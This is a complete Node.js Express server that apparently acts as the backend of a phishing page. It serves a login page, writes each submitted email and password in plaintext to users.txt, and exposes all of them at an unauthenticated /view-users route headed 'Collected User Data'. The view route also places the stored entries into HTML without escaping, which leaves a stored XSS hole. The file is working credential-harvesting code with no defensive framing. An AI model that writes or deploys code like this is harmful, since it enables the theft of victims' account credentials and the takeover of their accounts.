const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 10000;

// Middleware to parse form data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// Serve the login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Handle form submission
app.post('/submit', (req, res) => {
    const { email, password } = req.body;
    const timestamp = new Date().toLocaleString();
    const userData = `Email: ${email} | Password: ${password} | Time: ${timestamp}\n`;
    
    // Append to users.txt file
    fs.appendFile('users.txt', userData, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).json({ success: false });
        }
        res.json({ success: true });
    });
});

// View all users
app.get('/view-users', (req, res) => {
    fs.readFile('users.txt', 'utf8', (err, data) => {
        if (err) {
            if (err.code === 'ENOENT') {
                return res.send('<h1>No users yet</h1><p>No one has submitted the form yet.</p>');
            }
            return res.status(500).send('Error reading file');
        }
        
        // Format the data for display
        const entries = data.split('\n').filter(line => line.trim() !== '');
        let html = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>User Data</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        max-width: 1200px;
                        margin: 50px auto;
                        padding: 20px;
                        background-color: #f5f5f5;
                    }
                    h1 {
                        color: #333;
                    }
                    .entry {
                        background: white;
                        padding: 15px;
                        margin: 10px 0;
                        border-radius: 5px;
                        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                    }
                    .count {
                        color: #666;
                        font-size: 14px;
                        margin-bottom: 20px;
                    }
                </style>
            </head>
            <body>
                <h1>Collected User Data</h1>
                <p class="count">Total entries: ${entries.length}</p>
        `;
        
        entries.forEach((entry, index) => {
            html += `<div class="entry">${index + 1}. ${entry}</div>`;
        });
        
        html += `
            </body>
            </html>
        `;
        
        res.send(html);
    });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
